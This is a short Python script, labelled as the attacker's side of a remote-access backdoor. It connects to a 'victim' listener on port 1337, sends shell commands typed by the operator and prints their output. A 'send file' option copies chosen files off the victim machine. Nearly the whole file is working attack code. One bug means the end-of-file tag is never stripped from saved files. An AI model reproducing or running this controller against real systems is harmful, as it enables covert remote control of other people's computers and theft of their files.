# This file is used by the hacker
import socket

client_socket = socket.socket()
client_socket.connect(('127.0.0.1',1337)) # Connecting to victim
command = input("Command: ")
while command != 'exit': # Option to quit the connection
    if command == '': # avoiding sending no characters command
        command = input("Command: ")
        pass
    while command == 'send file': # Adding option to send file.

        client_socket.send(command.encode()) # Sending the send file "function"
        server_message = client_socket.recv(1024).decode() # Receiving message of choice
        print(server_message)
        server_message = client_socket.recv(1024).decode() # Receiving list of choice
        print(server_message)
        choice = input("Choose file: ") # Input for client choice
        client_socket.send(choice.encode()) # Sending client choice
        file_name = choice # Naming new file name
        file = open(file_name , 'wb') # Creating new file data will be inputted to
        file_bytes = b'' # Setting variable as bytes to accept data to
        done = False # Helps identify end of file
        while not done: # File receiving loop
            data = client_socket.recv(1024)
            file_bytes += data
            if file_bytes [-5:] == b'<END>': # When it hits the END tag at the end of the file, finish receiving
                done = True
                file_bytes.replace( b'<END>' , b'')
                print("Finished receiving file")

        file.write(file_bytes)
        file.close()
        command = input("Command: ")
        break




    client_socket.send(command.encode())
    output = client_socket.recv(1024).decode()
    print(output)
    command = input("Command: ")
    print(command)
client_socket.close()